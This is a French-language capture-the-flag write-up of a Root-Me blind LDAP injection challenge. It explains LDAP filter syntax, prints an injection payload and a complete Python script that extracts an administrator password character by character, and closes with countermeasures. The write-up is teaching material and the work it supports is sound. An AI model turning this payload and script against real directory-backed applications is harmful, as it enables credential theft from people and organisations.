# Injection LDAP en aveugle (Blind LDAP Injection) — Write-up

> Challenge **Root-Me — Web Serveur — LDAP injection (ch26)**
> Exfiltration d'un mot de passe caractère par caractère via une injection LDAP aveugle.

---

## 1. Rappel : qu'est-ce que LDAP ?

**LDAP** (*Lightweight Directory Access Protocol*) est un protocole d'accès à des annuaires. On le retrouve massivement dans les environnements d'entreprise : Active Directory, OpenLDAP, annuaires de comptes utilisateurs, etc.

Un annuaire LDAP stocke des **entrées** (utilisateurs, groupes, machines…) identifiées par un *Distinguished Name* (DN), et décrites par des **attributs** (`uid`, `cn`, `mail`, `password`…).

Pour interroger l'annuaire, on utilise des **filtres de recherche** qui suivent la *notation polonaise préfixée* (RFC 4515). Quelques exemples :

| Filtre | Signification |
|--------|---------------|
| `(uid=admin)` | l'attribut `uid` vaut exactement `admin` |
| `(uid=adm*)` | `uid` commence par `adm` (wildcard `*`) |
| `(&(uid=admin)(password=secret))` | `uid=admin` **ET** `password=secret` |
| `(\|(uid=a)(uid=b))` | `uid=a` **OU** `uid=b` |
| `(!(uid=admin))` | **NON** `uid=admin` |

Les opérateurs logiques (`&`, `|`, `!`) se placent **devant** les conditions, chacune entre parenthèses.

---

## 2. Le principe de l'injection LDAP

Une **injection LDAP** survient lorsqu'une application construit un filtre de recherche en **concaténant directement une entrée utilisateur**, sans l'échapper.

Imaginons un code serveur vulnérable de ce type :

```php
$search = $_GET['search'];
$filter = "(&(uid=" . $search . ")(objectClass=person))";
ldap_search($conn, $base_dn, $filter);
```

Si l'utilisateur envoie une valeur normale comme `admin`, le filtre devient :

```
(&(uid=admin)(objectClass=person))
```

Mais rien n'empêche un attaquant d'injecter des **métacaractères LDAP** (`*`, `(`, `)`, `&`, `|`) pour **modifier la structure logique** du filtre. C'est l'équivalent LDAP de l'injection SQL.

Par exemple, en envoyant `*`, le filtre devient :

```
(&(uid=*)(objectClass=person))
```

…ce qui retourne **tous** les utilisateurs de l'annuaire.

---

## 3. Injection « classique » vs injection « en aveugle »

### Injection classique
L'application affiche directement le résultat de la requête (par exemple la liste des utilisateurs correspondant). L'attaquant lit la réponse pour exfiltrer les données.

### Injection en aveugle (*blind*)
L'application **n'affiche pas** le contenu sensible. Elle ne renvoie qu'une information **binaire** indirecte :

- une **différence de réponse** : `1 result` vs `0 results`, page présente vs page vide ;
- un **comportement observable** : code HTTP, présence/absence d'un élément, temps de réponse…

On ne peut donc pas *lire* le mot de passe directement. Mais on peut le **deviner caractère par caractère** en posant une série de questions dont la réponse est « vrai » ou « faux ». C'est une attaque **booléenne** (*boolean-based blind*).

---

## 4. L'exfiltration caractère par caractère

L'idée centrale repose sur le **wildcard `*`** de LDAP, qui signifie « commence par » / « contient ».

On teste des hypothèses successives sur le mot de passe :

```
(password=a*)   → 0 résultat  → le mdp ne commence pas par "a"
(password=b*)   → 0 résultat  → ...
(password=d*)   → 1 résultat  → le mdp commence par "d" !
```

Une fois le premier caractère trouvé (`d`), on recommence pour le deuxième :

```
(password=da*)  → 0 résultat
(password=db*)  → 0 résultat
...
(password=ds*)  → 1 résultat  → "ds" !
```

Et ainsi de suite : `d` → `ds` → `dsy` → `dsyw` → … jusqu'à reconstituer tout le mot de passe. C'est exactement ce que montre la sortie du script : `d`, puis `ds`, puis `dsy`.

### Le payload d'injection

Dans le challenge, le paramètre `search` est injecté dans un filtre côté serveur. Le payload utilisé est :

```
admin*)(password=<préfixe_testé>
```

Injecté dans un filtre du type `(&(uid=<search>)...)`, cela donne une structure logique de la forme :

```
(&(uid=admin*)(password=dsy*)...)
```

- `admin*` → cible bien l'utilisateur **admin** ;
- `)(password=dsy` → **referme** la condition sur `uid` et **ajoute** une condition sur le `password` ;
- le serveur complète la fin avec son propre wildcard, ce qui revient à tester « le mot de passe d'admin commence-t-il par `dsy` ? ».

Si la réponse n'est **pas** `0 results`, c'est que le préfixe testé est correct.

---

## 5. Le programme d'exploitation

Le script automatise l'attaque booléenne : pour chaque position, il parcourt tout l'alphabet possible et conserve le caractère qui déclenche un résultat positif.

### Version robuste

```python
#!/usr/bin/python3
import requests, string, time

# Jeu de caractères possibles pour le mot de passe
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
BASE = "http://challenge01.root-me.org/web-serveur/ch26/"

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

def test(payload, retries=6):
    """Envoie un préfixe candidat et renvoie la réponse HTTP.
    Gère les coupures réseau (DNS, timeout) avec back-off progressif."""
    url = BASE + "?action=dir&search=admin*)(password=" + payload
    for attempt in range(retries):
        try:
            return session.get(url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"    [!] Erreur réseau ({e.__class__.__name__}), retry {attempt+1}/{retries}")
            time.sleep(2 * (attempt + 1))
    return None

flag = ""
for i in range(50):                       # longueur max supposée du mot de passe
    print("[i] Looking for number " + str(i))
    found = False
    for char in alphabet:                 # on teste chaque caractère possible
        r = test(flag + char)
        if r is None:
            print("[-] Abandon : réseau indisponible.")
            raise SystemExit(1)
        # Oracle booléen : "0 results" => hypothèse fausse
        if "0 results" not in r.text:
            flag += char
            print("[+] Flag: " + flag)
            found = True
            break
        time.sleep(0.1)                   # on ménage le serveur (anti-throttling)
    if not found:                         # aucun caractère ne matche => terminé
        print("[=] Terminé. Flag final : " + flag)
        break
```

### Explication pas à pas

| Élément | Rôle |
|---------|------|
| `alphabet` | ensemble des caractères testés à chaque position. Il faut qu'il couvre tous les caractères possibles du secret, sinon l'exfiltration bloque. |
| Boucle externe `for i` | avance position par position dans le mot de passe. |
| Boucle interne `for char` | teste chaque caractère candidat à la position courante. |
| `flag + char` | le préfixe déjà trouvé + le nouveau caractère testé. |
| **L'oracle** `"0 results" not in r.text` | cœur de l'attaque aveugle : la seule information exploitée est la **présence ou absence** de résultats. |
| `break` | dès qu'un caractère valide est trouvé, on passe à la position suivante. |
| `session` + `try/except` + `timeout` | robustesse : évite que le script meure à la première erreur réseau (cf. l'erreur `Temporary failure in name resolution` rencontrée). |
| `time.sleep(0.1)` | réduit le risque de se faire couper par le serveur pour trop de requêtes. |

### Pourquoi la version initiale plantait

Le script de départ était fonctionnellement correct (il avait déjà exfiltré `d`, `ds`, `dsy`), mais **sans aucune gestion d'erreur** : la moindre coupure réseau (ici un échec DNS temporaire) propageait l'exception jusqu'en haut et **tuait le processus**, perdant toute la progression. L'ajout du retry avec back-off et d'une session persistante règle ce problème.

---

## 6. Complexité de l'attaque

Pour un mot de passe de longueur **n** sur un alphabet de **k** caractères, l'attaque est **linéaire** et non exponentielle :

- au pire **n × k** requêtes (on ne reteste jamais les caractères déjà trouvés) ;
- en moyenne **n × k / 2**.

C'est précisément ce qui rend l'injection aveugle *booléenne* praticable : on ne devine pas le mot de passe entier d'un coup (ce qui serait kⁿ), on le reconstruit position par position.

> *Optimisation possible* : remplacer le parcours linéaire de l'alphabet par une **recherche dichotomique** sur la valeur du caractère (via des comparaisons `<=` / plages), ou **paralléliser** les requêtes pour accélérer l'exfiltration.

---

## 7. Contre-mesures

Pour se protéger des injections LDAP :

1. **Échapper les entrées** selon la RFC 4515 — neutraliser `* ( ) \ NUL` avec leur séquence `\XX` (ex. `*` → `\2a`). La plupart des langages fournissent une fonction dédiée (`ldap_escape()` en PHP, par exemple).
2. **Valider / filtrer en liste blanche** les caractères autorisés dans les champs attendus.
3. **Requêtes paramétrées** ou API qui séparent la structure du filtre et les valeurs utilisateur.
4. **Principe du moindre privilège** sur le compte de bind LDAP : il ne doit pas pouvoir lire des attributs sensibles comme `password`.
5. **Ne jamais stocker ni exposer de mot de passe en clair** dans l'annuaire (hachage, attribut non lisible).
6. **Uniformiser les réponses** pour supprimer l'oracle : mêmes messages, mêmes temps de réponse, qu'il y ait des résultats ou non.

---

## 8. Conclusion

L'injection LDAP en aveugle illustre un principe fondamental de la sécurité offensive : **même une fuite d'information minimale (1 bit : vrai/faux) suffit à exfiltrer un secret complet**, dès lors qu'on peut la rejouer autant de fois qu'on veut. Le défaut n'est pas « le mot de passe est affiché », mais « le comportement de l'application diffère selon le secret ».

La défense consiste donc autant à **échapper les entrées** qu'à **supprimer tout signal observable** qui pourrait servir d'oracle.

---

*Document rédigé à des fins pédagogiques dans le cadre d'un challenge de sécurité légal (Root-Me).*
